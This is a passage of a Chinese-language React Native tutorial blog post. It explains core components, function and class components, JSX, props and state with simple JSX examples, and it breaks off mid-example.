title=\"核心组件\"></a>核心组件</h3><p>React Native具有许多核心组件，从表单控件到活动指示器，应有尽有。 您可以在API部分找到所有记录的文档。 您将主要使用以下核心组件：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">RN UI 组件</th>\n<th style=\"text-align:left\">ANDROID VIEW</th>\n<th style=\"text-align:left\">IOS VIEW</th>\n<th style=\"text-align:left\">WEB ANALOG</th>\n<th style=\"text-align:left\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><code>&lt;View&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;ViewGroup&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;UIView&gt;</code></td>\n<td style=\"text-align:left\">A non-scrollling <code>&lt;div&gt;</code></td>\n<td style=\"text-align:left\">支持flexbox布局、样式、一些触摸处理和可访问性控制的容器</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>&lt;Text&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;TextView&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;UITextView&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;p&gt;</code></td>\n<td style=\"text-align:left\">显示，设置样式和嵌套文本字符串，甚至处理触摸事件</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>&lt;Image&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;ImageView&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;UIImageView&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;img&gt;</code></td>\n<td style=\"text-align:left\">显示不同类型的图像</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>&lt;ScrollView&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;ScrollView&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;UIScrollView&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;div&gt;</code></td>\n<td style=\"text-align:left\">通用滚动容器，可以包含多个组件和视图</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>&lt;TextInput&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;EditText&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;UITextField&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;input type=&quot;text&quot;&gt;</code></td>\n<td style=\"text-align:left\">允许用户输入文字</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; useState &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; View, Text, Image, ScrollView, TextInput, FlatList &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> App = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;ScrollView&gt;</span><br><span class=\"line\">      &lt;Text&gt;Some text&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Text&gt;Some moqqqre text&lt;/</span>Text&gt;</span><br><span class=\"line\">        &lt;Image source=&#123;&#123;<span class=\"attr\">uri</span>: <span class=\"string\">'bd'</span>&#125;&#125; style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">200</span>, <span class=\"attr\">height</span>: <span class=\"number\">200</span>&#125;&#125;&gt;&lt;/Image&gt;</span><br><span class=\"line\">        &lt;Image source=&#123;<span class=\"built_in\">require</span>(<span class=\"string\">'./1.png'</span>)&#125; style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">200</span>, <span class=\"attr\">height</span>: <span class=\"number\">200</span>, <span class=\"attr\">borderColor</span>: <span class=\"string\">'gray'</span>,  <span class=\"attr\">borderWidth</span>: <span class=\"number\">1</span>&#125;&#125;/&gt;</span><br><span class=\"line\">        &lt;Image source=&#123;&#123;<span class=\"attr\">uri</span>: <span class=\"string\">\"https://facebook.github.io/react-native/docs/assets/p_cat2.png\"</span>&#125;&#125; style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">200</span>, <span class=\"attr\">height</span>: <span class=\"number\">200</span>&#125;&#125;/&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;TextInput</span></span><br><span class=\"line\"><span class=\"regexp\">        style=&#123;&#123;</span></span><br><span class=\"line\"><span class=\"regexp\">          height: 40,</span></span><br><span class=\"line\"><span class=\"regexp\">          borderColor: 'gray',</span></span><br><span class=\"line\"><span class=\"regexp\">          borderWidth: 1</span></span><br><span class=\"line\"><span class=\"regexp\">        &#125;&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        defaultValue=\"You can type in me\"</span></span><br><span class=\"line\"><span class=\"regexp\">      /</span>&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/ScrollView&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  )</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">export default App;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"React基础\"><a href=\"#React基础\" class=\"headerlink\" title=\"React基础\"></a>React基础</h2><h3 id=\"组件\"><a href=\"#组件\" class=\"headerlink\" title=\"组件\"></a>组件</h3><h4 id=\"Function-Component\"><a href=\"#Function-Component\" class=\"headerlink\" title=\"Function Component\"></a>Function Component</h4> <figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Text &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Cat</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;Text&gt;Hello, I am your cat!&lt;/Text&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"Class-Component\"><a href=\"#Class-Component\" class=\"headerlink\" title=\"Class Component\"></a>Class Component</h4><figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Text &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cat</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;Text&gt;Hello, I am your cat!&lt;/Text&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这两种不同的组件之间的<strong>本质区别就是</strong>：有无state属性 和 生命周期函数！</p>\n<h3 id=\"JSX\"><a href=\"#JSX\" class=\"headerlink\" title=\"JSX\"></a>JSX</h3><figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Text &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Cat</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getFullName</span>(<span class=\"params\">firstName, secondName, thirdName</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> firstName + <span class=\"string\">\" \"</span> + secondName + <span class=\"string\">\" \"</span> + thirdName;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;Text&gt;</span><br><span class=\"line\">      Hello, I am &#123;getFullName(<span class=\"string\">\"Rum\"</span>, <span class=\"string\">\"Tum\"</span>, <span class=\"string\">\"Tugger\"</span>)&#125;!</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"自定义组件\"><a href=\"#自定义组件\" class=\"headerlink\" title=\"自定义组件\"></a>自定义组件</h3><figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"react\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Button, Text, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"react-native\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cat</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  state = &#123; <span class=\"attr\">isHungry</span>: <span class=\"literal\">true</span> &#125;;</span><br><span class=\"line\">  render(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View&gt;</span><br><span class=\"line\">        &lt;Text&gt;</span><br><span class=\"line\">          I am &#123;<span class=\"keyword\">this</span>.props.name&#125;, and I am</span><br><span class=\"line\">          &#123;<span class=\"keyword\">this</span>.state.isHungry ? <span class=\"string\">\" hungry\"</span> : <span class=\"string\">\" full\"</span>&#125;!</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Button</span></span><br><span class=\"line\"><span class=\"regexp\">          onPress=&#123;() =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">            this.setState(&#123; isHungry: false &#125;);</span></span><br><span class=\"line\"><span class=\"regexp\">          &#125;&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          disabled=&#123;!this.state.isHungry&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          title=&#123;</span></span><br><span class=\"line\"><span class=\"regexp\">            this.state.isHungry ? \"Pour me some milk, please!\" : \"Thank you!\"</span></span><br><span class=\"line\"><span class=\"regexp\">          &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        /</span>&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">export default class Cafe extends Component &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  render() &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    return (</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Cat name=\"Munkustrap\" /</span>&gt;</span><br><span class=\"line\">        &lt;Cat name=<span class=\"string\">\"Spot\"</span> /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"props\"><a href=\"#props\" class=\"headerlink\" title=\"props\"></a>props</h3><p><strong>类似于vue的父子组件传值</strong></p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Text, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Cat</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;View&gt;</span><br><span class=\"line\">      &lt;Text&gt;Hello, I am &#123;props.name&#125;!&lt;/Text&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">export default function Cafe() &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  return (</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;Cat name=\"Maru\" /</span>&gt;</span><br><span class=\"line\">      &lt;Cat name=<span class=\"string\">\"Jellylorum\"</span> /&gt;</span><br><span class=\"line\">      &lt;Cat name=<span class=\"string\">\"Spot\"</span> /&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"state\"><a href=\"#state\" class=\"headerlink\" title=\"state\"></a>state</h3><p><strong>类似于vue data对象</strong></p>\n<p><code>useState</code>：</p>\n<p><code>[&lt;getter&gt;, &lt;setter&gt;] = useState(&lt;initialValue&gt;)</code>。</p>\n<p>在函数组件中调用<code>useState</code>，就会创建一个单独的状态。</p>\n<p>在类组件中，<code>state</code> 总是一个对象，可以在该对象上添加保存属性。</p>\n<p>每次调用<code>useState</code>都会创建一个<code>state</code>块，其中包含一个值。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; useState &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"react\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Button, Text, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"react-native\"</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Cat</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 创建一个状态，并将其初始化为“true”</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> [isHungry, setIsHungry] = useState(<span class=\"literal\">true</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;View&gt;</span><br><span class=\"line\">      &lt;Text&gt;</span><br><span class=\"line\">        I am &#123;props.name&#125;, and I am &#123;isHungry ? <span class=\"string\">\"hungry\"</span> : <span class=\"string\">\"full\"</span>&#125;!</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;Button</span></span><br><span class=\"line\"><span class=\"regexp\">        onPress=&#123;() =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">          setIsHungry(false);</span></span><br><span class=\"line\"><span class=\"regexp\">        &#125;&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        disabled=&#123;!isHungry&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        title=&#123;isHungry ? \"Pour me some milk, please!\" : \"Thank you!\"&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">      /</span>&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">export default function Cafe() &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  return (</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;Cat name=\"Munkustrap\" /</span>&gt;</span><br><span class=\"line\">      &lt;Cat name=<span class=\"string\">\"Spot\"</span> /&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  );</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"react\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Button, Text, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"react-native\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cat</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 声明状态</span></span><br><span class=\"line\">  state = &#123; <span class=\"attr\">isHungry</span>: <span class=\"literal\">true</span> &#125;;</span><br><span class=\"line\">  render(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View&gt;</span><br><span class=\"line\">        &lt;Text&gt;</span><br><span class=\"line\">          I am &#123;<span class=\"keyword\">this</span>.props.name&#125;, and I am</span><br><span class=\"line\">          &#123;<span class=\"keyword\">this</span>.state.isHungry ? <span class=\"string\">\" hungry\"</span> : <span class=\"string\">\" full\"</span>&#125;!</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Button</span></span><br><span class=\"line\"><span class=\"regexp\">          onPress=&#123;() =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">            &#123;/</span>* 通过 setState 改变状态 *<span class=\"regexp\">/&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">            this.setState(&#123; isHungry: false &#125;);</span></span><br><span class=\"line\"><span class=\"regexp\">          &#125;&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          disabled=&#123;!this.state.isHungry&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          title=&#123;</span></span><br><span class=\"line\"><span class=\"regexp\">            this.state.isHungry ? \"Pour me some milk, please!\" : \"Thank you!\"</span></span><br><span class=\"line\"><span class=\"regexp\">          &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        /</span>&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">export default class Cafe extends Component &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  render() &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    return (</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Cat name=\"Munkustrap\" /</span>&gt;</span><br><span class=\"line\">        &lt;Cat name=<span class=\"string\">\"Spot\"</span> /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"RN的Props\"><a href=\"#RN的Props\" class=\"headerlink\" title=\"RN的Props\"></a>RN的Props</h2><h3 id=\"原生组件的props\"><a href=\"#原生组件的props\" class=\"headerlink\" title=\"原生组件的props\"></a>原生组件的props</h3><p>以常见的基础组件<code>Image</code>为例，在创建一个图片时，可以传入一个名为<code>source</code>的 prop 来指定要显示的图片的地址，以及使用名为<code>style</code>的 prop 来控制其尺寸。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Image &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Bananas</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> pic = &#123;</span><br><span class=\"line\">      uri: <span class=\"string\">'https://upload.wikimedia.org/wikipedia/commons/d/de/Bananavarieties.jpg'</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;Image source=&#123;pic&#125; style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">193</span>, <span class=\"attr\">height</span>: <span class=\"number\">110</span>&#125;&#125; /&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"自定义组件-1\"><a href=\"#自定义组件-1\" class=\"headerlink\" title=\"自定义组件\"></a>自定义组件</h3><figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Text, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Greeting</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;&#123;<span class=\"attr\">alignItems</span>: <span class=\"string\">'center'</span>, <span class=\"attr\">marginTop</span>: <span class=\"number\">50</span>&#125;&#125;&gt;</span><br><span class=\"line\">        &#123;<span class=\"comment\">/* Greeting组件中将name作为一个属性来定制 */</span>&#125;</span><br><span class=\"line\">        &lt;Text&gt;Hello &#123;<span class=\"keyword\">this</span>.props.name&#125;!&lt;/Text&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">export default class LotsOfGreetings extends Component &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  render() &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    return (</span></span><br><span class=\"line\"><span class=\"regexp\">      